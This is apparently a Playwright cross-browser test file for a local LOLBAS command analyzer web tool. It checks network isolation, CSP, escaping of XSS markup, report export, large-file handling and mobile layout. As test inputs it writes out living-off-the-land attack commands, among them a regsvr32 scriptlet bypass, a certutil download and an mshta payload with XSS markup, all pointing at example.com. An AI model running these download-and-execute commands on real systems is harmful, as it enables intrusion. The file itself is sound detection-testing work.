/*
 * Cross-browser acceptance (Firefox, WebKit) for the LotL / LOLBAS Command Analyzer via Playwright.
 * Playwright is NOT a repository dependency (see tests/log-anonymizer-xbrowser.test.cjs for installation):
 *   NODE_PATH=<pw>/node_modules node tests/lotl-analyzer-xbrowser.test.cjs [url] [evidence-dir] [browsers]
 * Real Safari and iOS devices are not covered: Playwright WebKit on Windows is the WebKit engine, not Safari.
 */
'use strict';
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { expand } = require('./lotl-analyzer-corpus.test.cjs');
let playwright;
try { playwright = require('playwright'); } catch (e) { console.log('SKIP: Playwright is not installed (intentionally not a repository dependency).'); process.exit(0); }

const URL_UNDER_TEST = process.argv[2] || 'http://127.0.0.1:8090/tools/lotl-command-analyzer/';
const ORIGIN = new URL(URL_UNDER_TEST).origin;
const EVIDENCE = process.argv[3] || path.join(os.homedir(), 'CyberDat-tools-lotl-xbrowser-' + Date.now());
const BROWSERS = (process.argv[4] || 'firefox,webkit').split(',');
fs.mkdirSync(EVIDENCE, { recursive: true });
const sleep = ms => new Promise(r => setTimeout(r, ms));
const summary = {};
const corpus = JSON.parse(fs.readFileSync(path.join(__dirname, 'fixtures/lotl-analyzer/corpus.json'), 'utf8'));
const lines = corpus.suspicious.concat(corpus.benign).map(c => expand(c.cmd)).join('\n') + '\n';
const BIG = path.join(os.tmpdir(), 'cd-lotl-xbrowser.txt');
{ let t = ''; while (t.length + lines.length < 4.9 * 1024 * 1024) { t += lines; } fs.writeFileSync(BIG, t); }

async function runBrowser(name) {
	const results = [];
	const pass = (label, detail) => { results.push({ label, detail }); console.log(`PASS [${name}]: ${label}${detail ? ' — ' + detail : ''}`); };
	const browser = await playwright[name].launch();
	const context = await browser.newContext(Object.assign({ acceptDownloads: true, viewport: { width: 1280, height: 900 } }, require('./lib/basic-auth.cjs').playwrightOptions()));
	const requests = [];
	const consoleErrors = [];
	let phase = 'load';
	context.on('request', r => requests.push({ phase, url: r.url() }));
	const page = await context.newPage();
	page.on('console', m => { if (m.type() === 'error') { consoleErrors.push({ phase: phase === 'csp-probe' || /debugger eval code/.test(m.text()) ? 'probe' : phase, text: m.text() }); } });
	page.on('pageerror', e => consoleErrors.push({ phase, text: 'pageerror: ' + e.message }));
	const dialogs = [];
	page.on('dialog', d => { dialogs.push(d.message()); d.dismiss(); });
	const until = async (fn, arg, timeout = 20000) => { const end = Date.now() + timeout; while (Date.now() < end) { if (await page.evaluate(fn, arg).catch(() => false)) { return; } await sleep(100); } throw new Error('Timed out: ' + fn.toString().slice(0, 80)); };
	const http = p => requests.filter(r => r.phase === p && /^(https?|wss?):/.test(r.url));
	const run = async (timeout = 60000) => {
		await page.click('[data-lotl-run]');
		await until(() => (!document.querySelector('[data-lotl-results]').hidden && !document.querySelector('[data-lotl-run]').disabled) || !document.querySelector('[data-lotl-error]').hidden, null, timeout);
		assert.equal(await page.$eval('[data-lotl-error]', e => (e.hidden ? '' : e.textContent)), '');
	};
	const ready = () => until(() => document.readyState === 'complete' && !!document.querySelector('[data-lotl-app]') && !document.querySelector('[data-lotl-app]').hidden);
	try {
		await page.goto(URL_UNDER_TEST);
		await ready();
		await sleep(500);
		const load = requests.filter(r => /^https?:/.test(r.url));
		assert.deepEqual(load.filter(r => new URL(r.url).origin !== ORIGIN), []);
		const w = page.workers();
		assert.ok(w.some(x => /lotl-analyzer\/worker\.js/.test(x.url())));
		const lock = await w[0].evaluate(() => ['fetch', 'XMLHttpRequest', 'WebSocket', 'importScripts'].map(n => { try { if (n === 'fetch') { self.fetch('/'); } else { new self[n]('/'); } return n + ':allowed'; } catch (e) { return n + ':blocked'; } }).join(','));
		assert.ok(!/allowed/.test(lock));
		pass('first-party page load; same-origin worker with network APIs disabled', lock);

		phase = 'csp-probe';
		const probe = await page.evaluate(() => fetch('https://raw.githubusercontent.com/', { mode: 'no-cors' }).then(() => 'unblocked', e => 'blocked: ' + e.message));
		assert.match(probe, /^blocked/);
		pass('CSP blocks page scripts from contacting GitHub or any host', probe.slice(0, 50));

		phase = 'process';
		await page.click('[data-lotl-sample]');
		await run();
		const st = await page.evaluate(() => ({ verdict: document.querySelector('[data-lotl-verdict]').textContent, sev: [...document.querySelectorAll('[data-lotl-commands] > li')].map(li => li.className.replace(/.*--/, '')), text: document.querySelector('[data-lotl-commands]').textContent }));
		assert.match(st.verdict, /strongly resembling/);
		assert.ok(st.sev.length === 8 && st.sev.filter(s => s === 'high').length >= 4 && /T1105/.test(st.text) && /DownloadString/.test(st.text));
		pass('examples analyzed: LOLBAS matches with ATT&CK ids from LOLBAS, encoded PowerShell decoded', st.sev.join(','));
		await page.screenshot({ path: path.join(EVIDENCE, name + '-01-results.png') });

		await page.fill('[data-lotl-input]', 'mshta "javascript:document.write(\'<img src=x onerror=alert(1)>\')" <script>alert(2)</script>\n<svg onload=alert(3)> certutil -urlcache -f http://example.com/"><img src=x onerror=alert(4)> a');
		await run();
		await sleep(300);
		const x = await page.evaluate(() => ({ el: document.querySelectorAll('.cd-la-results img, .cd-la-results script, .cd-la-results svg').length, bad: [...document.querySelectorAll('.cd-la-results a')].filter(a => !/^https:\/\//.test(a.getAttribute('href'))).length }));
		assert.deepEqual(x, { el: 0, bad: 0 });
		assert.deepEqual(dialogs, []);
		pass('markup and scripts in commands are shown as text only; no dialogs');

		await page.click('[data-lotl-sample]');
		await run();
		const dl = await Promise.all([page.waitForEvent('download'), page.click('[data-lotl-report]')]);
		const out = path.join(EVIDENCE, name + '-report.json');
		await dl[0].saveAs(out);
		const rep = JSON.parse(fs.readFileSync(out, 'utf8'));
		assert.equal(rep.lolbasData.license, 'GPL-3.0');
		assert.equal(rep.commands.length, 8);
		assert.equal(await page.evaluate(() => JSON.stringify([localStorage.length, sessionStorage.length, document.cookie])), JSON.stringify([0, 0, '']));
		pass('JSON report generated locally; nothing stored');

		phase = 'large';
		await page.setInputFiles('[data-lotl-file]', BIG);
		await until(() => /Large files are not displayed/.test(document.querySelector('[data-lotl-source]').textContent));
		const t0 = Date.now();
		await run(180000);
		const ms = Date.now() - t0;
		assert.deepEqual(http('large'), []);
		summary[name + 'LargeMs'] = ms;
		pass('4.9 MB file analyzed without network requests', (ms / 1000).toFixed(1) + ' s');

		phase = 'cancel';
		await page.click('[data-lotl-run]');
		await page.click('[data-lotl-cancel]');
		await until(() => /Cancelled/.test(document.querySelector('[data-lotl-status]').textContent));
		await sleep(800);
		const cr = http('cancel');
		assert.ok(cr.every(r => /\/assets\/js\/lotl-analyzer\/(?:worker|engine|lolbas-data)\.js\?ver=\d+/.test(r.url) && new URL(r.url).origin === ORIGIN), JSON.stringify(cr));
		pass('Cancel re-requests only static same-origin worker scripts', cr.length + ' requests');
		await page.click('[data-lotl-clear]');
		phase = 'final';
		assert.deepEqual(requests.filter(r => !['load', 'csp-probe', 'cancel'].includes(r.phase) && /^(https?|wss?):/.test(r.url)), []);
		assert.deepEqual(consoleErrors.filter(e => e.phase !== 'probe'), []);
		pass('input text is never sent: no HTTP requests during analysis, export and clearing; no console errors');

		await page.setViewportSize({ width: 360, height: 780 });
		await page.goto(URL_UNDER_TEST);
		await ready();
		await page.click('[data-lotl-sample]');
		await run();
		const o = await page.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth, small: [...document.querySelectorAll('.cd-lotl button:not([hidden]), .cd-lotl summary')].filter(e => e.offsetParent && e.getBoundingClientRect().height < 44).length }));
		assert.ok(o.sw <= o.cw);
		assert.equal(o.small, 0);
		await page.screenshot({ path: path.join(EVIDENCE, name + '-02-mobile-360.png') });
		pass('360px: no horizontal overflow, touch targets ≥ 44px', 'scrollWidth ' + o.sw);

		await page.fill('[data-lotl-input]', 'regsvr32 /s /n /u /i:http://example.com/x.sct scrobj.dll');
		await page.focus('[data-lotl-input]');
		await page.keyboard.press('Shift+Tab');
		await page.keyboard.press('Tab');
		await page.keyboard.press('Control+Enter');
		await until(() => !document.querySelector('[data-lotl-results]').hidden && /AWL Bypass/.test(document.querySelector('[data-lotl-commands]').textContent));
		pass('keyboard: Ctrl+Enter in the text box runs the analysis');
	} finally {
		summary[name] = results.length;
		fs.writeFileSync(path.join(EVIDENCE, name + '-results.json'), JSON.stringify({ browser: name, version: browser.version(), results, consoleErrors }, null, 2));
		await browser.close();
	}
}

(async () => {
	for (const n of BROWSERS) { await runBrowser(n); }
	fs.writeFileSync(path.join(EVIDENCE, 'xbrowser-results.json'), JSON.stringify(summary, null, 2));
	console.log('\nAll cross-browser checks passed: ' + JSON.stringify(summary));
	try { fs.unlinkSync(BIG); } catch (e) { /* ignore */ }
})().catch(e => { console.error('FAIL: ' + e.message); try { fs.unlinkSync(BIG); } catch (x) { /* ignore */ } process.exit(1); });
